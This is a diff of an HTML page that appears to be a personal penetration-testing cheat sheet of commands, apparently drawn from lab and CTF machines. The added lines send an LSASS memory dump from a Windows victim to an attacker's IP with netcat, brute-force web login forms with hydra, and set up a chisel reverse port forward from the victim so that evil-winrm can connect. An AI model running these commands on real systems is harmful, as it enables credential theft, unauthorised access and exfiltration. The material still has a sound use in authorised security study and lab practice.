@@ -168,10 +168,25 @@ vim -c ':!/bin/sh'                  #vim</code></pre>
                 <ul>
                     <h2>NetCat</h2>
                     <ul>
-                    <p>Where you recieve the file</p>
-                    <pre><code class="language-python">nc -l -p 1234 -q 1 > FILE < /dev/null</code> </pre>
-                    <p>From where you transfer the file</p>
-                    <pre><code class="language-python">cat FILE | nc TARGET_IP TARGET_PORT</code> </pre>
+
+                    <h3>Linux -> Linux</h3>
+                    <ul>
+                        <p>Where you recieve the file</p>
+                        <pre><code class="language-bash">nc -l -p 1234 -q 1 > FILE < /dev/null</code> </pre>
+                        <p>From where you transfer the file</p>
+                        <pre><code class="language-bash">cat FILE | nc TARGET_IP TARGET_PORT</code> </pre>
+                    </ul>
+
+                    <h3>Windows -> Linux</h3>
+                    <ul>
+                        <p>Where you recieve the file</p>
+                        <pre><code class="language-python">nc -lvnp 7777 > lsass.dmp</code> </pre>
+                        <p>From where you transfer the file</p>
+                        <pre><code class="language-python">type C:\Users\alaading\Desktop\lsass.dmp | .\nc.exe 10.10.14.91 7777</code> </pre>
+                       
+
+                    </ul>
+                
                     </ul>    
 
 
@@ -349,11 +364,12 @@ hydra -L user.list -P password.list smb://10.129.42.197
 hydra -L user.list -P password.list 10.129.42.197 smb</code></pre>
                     <p>Specific example of performing bruteforce to a website</p>    
                     <pre><code class="language-bash">#Single user a lot of passwords incorrect is a specific string which shows a loggin attempt has failed
-hydra -l admin -P password.txt http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"
+hydra -l admin -P passwords streamio.htb http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"
+hydra -L users -P passwords streamio.htb https-post-form "/login.php:username=^USER^&password=^PASS^:F=Login Failed"
 #Look for response code 302  
-hydra -l admin -P password.txt http-post-form "/login.php:user=^USER^&pass=^PASS^:S=302"
+hydra -l admin -P password.txt streamio.htb http-post-form "/login.php:user=^USER^&pass=^PASS^:S=302"
 #Using two wordlists
-hydra -L shortlist.txt -P passwords.txt -f 94.237.120.119 -s 52867 http-post-form "/:username=^USER^&password=^PASS^:F=Invalid"
+hydra -L shortlist.txt -P passwords.txt -f 94.237.120.119 -s 52867 http-post-form "/:username=^USER^&password=^PASS^:F=Invalid"  #-f means stop after first login found
 #Bruteforcing basic auth. The one with the tipical alert which say username and password   
 hydra -l basic-auth-user -P 2023-200_most_used_passwords.txt TARGET_IP http-get / -s PORT</code></pre>
 
@@ -527,6 +543,39 @@ echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPqRDQ0mTYDYnx0cJOUWyNGGrhhjYddfIIoO9H
                         <pre><code class="language-bash">python3 dpat.py -n /home/kali/.nxc/logs/ntds/dump.ntds -c /home/kali/.nxc/logs/ntds/cracked.txt -p 8</code></pre>
                         <p>Then pres <b>y</b> to generate a report</p>
                 </ul>    
+            </div>
+
+            <div class="notion-header">
+                <h1 id="Port Forwarding chisel">Port Forwarding chisel</h1>
+            </div>   
+
+            <div class="banner">
+                <ul>
+                    <h2>Reverse portforwarding</h2>
+                    <ul>
+                        <p>Supose a case when you need to acces a localport in the target machine which is not available from outside meaning you attacker machine. In this case we could use chisel in order to perform a reverse port forwarding</p>
+                        <h2>Setup</h2>
+                        <ul>
+                        <p>First download the corresponding binaries from <a class="notion-link" href="https://github.com/jpillora/chisel/releases/tag/v1.11.5">here</a> and trasfer one of the to the victim machine. The other one must stay in your attacker machine</p>
+                        <h3>Victim machine</h3>
+                        <ul>
+                            <pre><code class="language-bash">.\chisel_w.exe client 10.10.14.91:1234 R:5985:127.0.0.1:5985</code></pre>
+                            <p>Have in mind that in this case we are reverse forwading the winrm port 5985. In the command we can see first the IP of the attacker with the new destination port and then local ip address of the victim and the origin port</p>
+                        </ul>
+                        
+                        <h3>Attacker machine</h3>
+                        <ul>
+                            <pre><code class="language-bash">./chisel_l server -p 1234 --reverse </code></pre>
+                            <p>Here we can see that our attacking machine is the server and the destination port where the port forward will point</p>
+                        </ul>
+                     </ul>   
+                     <h2>Testing</h2>
+                     <ul>
+                        <p>With that configuration in place now we could be able to perform a winrm connection as follows</p>
+                        <pre><code class="language-bash">evil-winrm -i 127.0.0.1 -u user -p password</code></pre>
+                     </ul>
+                     </ul>
+                </ul>
             </div>
 
             <div class="notion-header">
